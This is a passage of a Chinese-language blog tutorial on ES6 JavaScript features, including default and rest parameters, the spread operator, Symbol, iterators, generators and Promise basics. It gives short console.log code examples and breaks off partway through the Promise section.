<pre class="language-js" data-language="js"><code class="language-js"> <span class="token keyword">let</span> <span class="token function-variable function">pow</span> <span class="token operator">=</span> <span class="token parameter">n</span> <span class="token operator">=></span> n<span class="token operator">*</span>n<span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//64</span> <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  name<span class="token operator">:</span> <span class="token string">'6'</span><span class="token punctuation">,</span>  <span class="token function-variable function">getName</span><span class="token operator">:</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//此时this指向window</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></p><h2 id="七、参数默认值"><a href="#七、参数默认值" class="headerlink" title="七、参数默认值"></a>七、参数默认值</h2><p> ES6允许给函数参数赋初始值(如果传了值,就用传过来的值,没有的话就用初始值)</p><p> ①形参初始值,具有默认值的参数一般要靠后放(潜规则)<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">10</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token operator">+</span>c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token comment">//16</span></code></pre><br> ②与解构赋值结合<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">content</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">,</span>age<span class="token punctuation">,</span>hoby<span class="token punctuation">,</span>dream <span class="token operator">=</span> <span class="token string">"月入w"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//小6</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//不祥</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>hoby<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//写bug</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>dream<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//月入w</span><span class="token punctuation">&#125;</span><span class="token function">content</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> name<span class="token operator">:</span> <span class="token string">'小6'</span><span class="token punctuation">,</span> age<span class="token operator">:</span> <span class="token string">'不祥'</span><span class="token punctuation">,</span> hoby<span class="token operator">:</span> <span class="token string">'写bug'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre></p><h2 id="八、rest参数"><a href="#八、rest参数" class="headerlink" title="八、rest参数"></a>八、rest参数</h2><p> ES6引入rest参数,用于获取函数的实参,用来代替 arguments<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//ES5获取实参方式</span> <span class="token keyword">function</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">'小沈阳'</span><span class="token punctuation">,</span><span class="token string">'赵本山'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//rest 参数</span> <span class="token keyword">function</span> <span class="token function">Data</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">Data</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token comment">//rest 参数必须要放到参数最后</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span></code></pre></p><h2 id="九、扩展运算符"><a href="#九、扩展运算符" class="headerlink" title="九、扩展运算符"></a>九、扩展运算符</h2><h3 id="1-作用"><a href="#1-作用" class="headerlink" title="1. 作用"></a>1. 作用</h3><p> <code>...</code> 扩展运算符能将数组转换为逗号分隔的参数序列<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//声明一个数组</span><span class="token keyword">const</span> <span class="token constant">F4</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'小沈阳'</span><span class="token punctuation">,</span><span class="token string">'赵本山'</span><span class="token punctuation">,</span><span class="token string">'刘能'</span><span class="token punctuation">,</span><span class="token string">'赵四'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//'小沈阳','赵本山','刘能','赵四'</span><span class="token keyword">function</span> <span class="token function">Chunw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">Chunw</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token constant">F4</span><span class="token punctuation">)</span> <span class="token comment">//'小沈阳','赵本山','刘能','赵四'</span></code></pre></p><h3 id="2-扩展运算符的运用"><a href="#2-扩展运算符的运用" class="headerlink" title="2. 扩展运算符的运用"></a>2. 扩展运算符的运用</h3><h4 id="①-数组的合并"><a href="#①-数组的合并" class="headerlink" title="① 数组的合并"></a>① 数组的合并</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> kuaizi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'肖央'</span><span class="token punctuation">,</span><span class="token string">'王太利'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">F2</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'小6'</span><span class="token punctuation">,</span><span class="token string">'张三'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> Arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>kuaizi<span class="token punctuation">,</span><span class="token operator">...</span><span class="token constant">F2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Arr<span class="token punctuation">)</span><span class="token comment">//['肖央', '王太利', '小6', '张三']</span></code></pre><h4 id="②-数组的克隆"><a href="#②-数组的克隆" class="headerlink" title="② 数组的克隆"></a>② 数组的克隆</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> szh <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'张四'</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> syc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>szh<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//如果数组中含有引用数据类型的 也是属于浅拷贝</span>syc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'66'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>szh<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>syc<span class="token punctuation">)</span></code></pre><h4 id="③-将伪数组转为真正的数组"><a href="#③-将伪数组转为真正的数组" class="headerlink" title="③ 将伪数组转为真正的数组"></a>③ 将伪数组转为真正的数组</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> divs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>divs<span class="token punctuation">)</span><span class="token keyword">const</span> divArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>divs<span class="token punctuation">]</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>divArr<span class="token punctuation">)</span></code></pre><h2 id="十、Symbol"><a href="#十、Symbol" class="headerlink" title="十、Symbol"></a>十、Symbol</h2><h3 id="1-什么是Symbol"><a href="#1-什么是Symbol" class="headerlink" title="1. 什么是Symbol"></a>1. 什么是Symbol</h3><p> Symbol 表示独一无二的值,类似于字符串的数据类型</p><h3 id="2-特点-3"><a href="#2-特点-3" class="headerlink" title="2. 特点"></a>2. 特点</h3><p> ① Symbol的值是唯一的,用来解决命名冲突的问题</p><p> ② Symbol的值不能与其他数据进行运算</p><p> ③ Symbol定义的对象属性不能使用for…in循环遍历,但是可以使用Reflect.ownKeys来获取对象的所有键名</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> s <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token keyword">typeof</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Symbol() 'symbol'</span><span class="token keyword">let</span> s1 <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'测试'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Symbol(测试)</span><span class="token comment">//Symbol.for 创建</span><span class="token keyword">let</span> s2 <span class="token operator">=</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">'测试001'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token comment">//Symbol(测试001)</span><span class="token comment">//不能和其他数据类型进行运算</span><span class="token comment">// let result = s + 100;</span><span class="token comment">// let result = s > 10;</span><span class="token comment">// let result = s + s;</span><span class="token comment">// console.log(result); //报错</span></code></pre><p> ④ 向对象中添加方法<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//向对象中添加方法 up down</span>  <span class="token keyword">let</span> game <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    name<span class="token operator">:</span> <span class="token string">'俄罗斯方块'</span><span class="token punctuation">,</span>    <span class="token function-variable function">up</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'上'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">down</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'下'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> methods <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    up<span class="token operator">:</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    down<span class="token operator">:</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span>  game<span class="token punctuation">[</span>methods<span class="token punctuation">.</span>up<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以改变形状'</span><span class="token punctuation">)</span>  game<span class="token punctuation">[</span>methods<span class="token punctuation">.</span>down<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以快速向上'</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>game<span class="token punctuation">)</span></code></pre><br> ⑤ 创建对象属性<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//Symbol创建对象属性</span> <span class="token keyword">let</span> youxi <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   name<span class="token operator">:</span> <span class="token string">'狼人杀'</span><span class="token punctuation">,</span>   <span class="token comment">//[Symbol('say')] Sybol是一个动态的,通过这种方式添加属性</span>   <span class="token punctuation">[</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'say'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以发言'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>   <span class="token punctuation">[</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'zibao'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以自爆'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>youxi<span class="token punctuation">)</span></code></pre></p><h2 id="十一、Iterator"><a href="#十一、Iterator" class="headerlink" title="十一、Iterator"></a>十一、Iterator</h2><h3 id="1-什么是Iterator"><a href="#1-什么是Iterator" class="headerlink" title="1. 什么是Iterator"></a>1. 什么是Iterator</h3><p> iterator接口在JS中相当于对象的一个属性,属性名是Symbol.iterator,属性值是一个函数</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> xyj <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'唐僧'</span><span class="token punctuation">,</span><span class="token string">'孙悟空'</span><span class="token punctuation">,</span><span class="token string">'猪八戒'</span><span class="token punctuation">,</span><span class="token string">'沙僧'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> v <span class="token keyword">in</span> xyj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//for...in循环前面的变量v保存的是,键名</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0 1 2 3</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> v <span class="token keyword">of</span> xyj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//for...of循环前面的变量v保存的是,键值</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//'唐僧','孙悟空','猪八戒','沙僧'</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-工作原理-迭代器遍历数据的原理"><a href="#2-工作原理-迭代器遍历数据的原理" class="headerlink" title="2. 工作原理(迭代器遍历数据的原理)"></a>2. 工作原理(迭代器遍历数据的原理)</h3><p> ①创建一个指针对象,指向当前数据结构的起始位置</p><p> ②第一次调用它的next方法,指针指向数据结构的第一个成员</p><p> ③不断调用next方法,指针一直往后移动,直到最后一个成员</p><p> ④每调用一个next方法,返回一个包含value和done属性的值<br> <pre class="language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//&#123;value: '唐僧', done: false&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//&#123;value: '唐僧', done: false&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//&#123;value: '唐僧', done: false&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//&#123;value: undefined, done: true&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>iterator<span class="token punctuation">)</span></code></pre></p><h2 id="十二、生成器"><a href="#十二、生成器" class="headerlink" title="十二、生成器"></a>十二、生成器</h2><h3 id="1-生成器"><a href="#1-生成器" class="headerlink" title="1. 生成器"></a>1. 生成器</h3><p> 生成器也是一个特殊的函数,这个函数主要用来做异步编程,函数代码的分隔符yield,它返回的结果是一个迭代器对象<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token operator">*</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">yield</span> <span class="token string">'一只没有耳朵'</span><span class="token punctuation">;</span>    <span class="token keyword">yield</span> <span class="token string">'一只没有尾巴'</span><span class="token punctuation">;</span>    <span class="token keyword">yield</span> <span class="token string">'真奇怪'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> iterator <span class="token operator">=</span> <span class="token function">gen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//它返回的结果是一个迭代器对象</span>  <span class="token comment">//调用next()方法才会运行</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#123;</span>value<span class="token operator">:</span> <span class="token string">'一只没有耳朵'</span><span class="token punctuation">,</span> done<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#123;</span>value<span class="token operator">:</span> <span class="token string">'一只没有尾巴'</span><span class="token punctuation">,</span> done<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#123;</span>value<span class="token operator">:</span> <span class="token string">'真奇怪'</span><span class="token punctuation">,</span> done<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#123;</span>value<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> done<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span></code></pre></p><h3 id="2-生成器函数参数"><a href="#2-生成器函数参数" class="headerlink" title="2. 生成器函数参数"></a>2. 生成器函数参数</h3><p> next可以传入参数,传入参数将作为上一个yield语句的返回结果<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//生成器函数参数</span> <span class="token keyword">function</span> <span class="token operator">*</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token parameter">args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//AAA</span>   <span class="token keyword">let</span> one <span class="token operator">=</span><span class="token keyword">yield</span> <span class="token number">111</span><span class="token punctuation">;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span> <span class="token comment">//BB</span>   <span class="token keyword">let</span> two<span class="token operator">=</span> <span class="token keyword">yield</span> <span class="token number">222</span><span class="token punctuation">;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>two<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//CC</span>   <span class="token keyword">let</span> three<span class="token operator">=</span> <span class="token keyword">yield</span> <span class="token number">333</span><span class="token punctuation">;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>three<span class="token punctuation">)</span> <span class="token comment">//DD</span> <span class="token punctuation">&#125;</span> <span class="token comment">//获取迭代器对象</span> <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">'AAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//&#123;value: 111, done: false&#125;</span>  <span class="token comment">//next也可以传入参数,传入参数将作为上一个yield语句的返回结果</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token string">'BB'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//&#123;value: 222, done: false&#125;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token string">'CC'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//&#123;value: 333, done: false&#125;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token string">'DD'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//&#123;value: undefined, done: true&#125;</span></code></pre></p><h2 id="十三、Promise基本语法"><a href="#十三、Promise基本语法" class="headerlink" title="十三、Promise基本语法"></a>十三、Promise基本语法</h2><h3 id="1-实例化Promise对象"><a href="#1-实例化Promise对象" class="headerlink" title="1. 实例化Promise对象"></a>1. 实例化Promise对象</h3><p> new Promise(参数) 参数为一个函数,函数有两个形参resolve,reject 这两个参数也是函数</p><h3 id="2-对象状态"><a href="#2-对象状态" class="headerlink" title="2. 对象状态"></a>2. 对象状态</h3><p> 初始化(pending)、成功(fulfilled)、失败(rejected)</p><h3 id="3-状态变更"><a href="#3-状态变更" class="headerlink" title="3. 状态变更"></a>3. 状态变更</h3><p> 调用resolve、reject这两个函数,来改变promise对象的状态</p><p>  ①调用resolve，promise对象的状态就会变为成功,成功后调用promise对象的then方法,之后会执行then方法中第一个回调函数</p><p>  ②调用reject，promise对象的状态就会变为失败,失败后调用promise对象的then方法,之后会执行then方法中第二个回调函数</p><h3 id="4-then方法"><a href="#4-then方法" class="headerlink" title="4. then方法"></a>4. then方法</h3><ol><li><p>promise对象的then方法,then方法接收两个参数,两个参数都是函数类型的值</p><p>成功的形参一般是value,失败的形参一般是reason</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token comment">//成功状态</span>      <span class="token comment">//  let data = '数据拉取成功';</span>      <span class="token comment">//  resolve(data); //将对象的状态变为成功,之后执行then方法中的第一个回调函数</span>      <span class="token comment">//失败状态</span>       <span class="token keyword">let</span> data2 <span class="token operator">=</span> <span class="token string">'数据拉取失败'</span><span class="token punctuation">;</span>       <span class="token function">reject</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">reason</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre></li><li><p>调用then方法,then方法返回的结果是promise对象,对象的状态由回调函数的执行结果决定</p><p>① 如果回调函数中返回的结果是非promise类型数据,状态为成功,返回值为对象的成功值</p><p>② 如果回调函数种返回的结果是promise对象,内部返回的promise状态决定then方法返回promise的状态</p><p>③ 如果回调函数内部返回的结果是抛出错误,状态也是失败,返回值为抛出的值</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//可以通过链式调用解决回调地狱</span> <span class="token keyword">let</span> result<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>   <span class="token comment">// return new Promise((resolve,reject) => &#123;</span>   <span class="token comment">//   reject('error')//二内部promise</span>   <span class="token comment">// &#125;)</span>   <span class="token 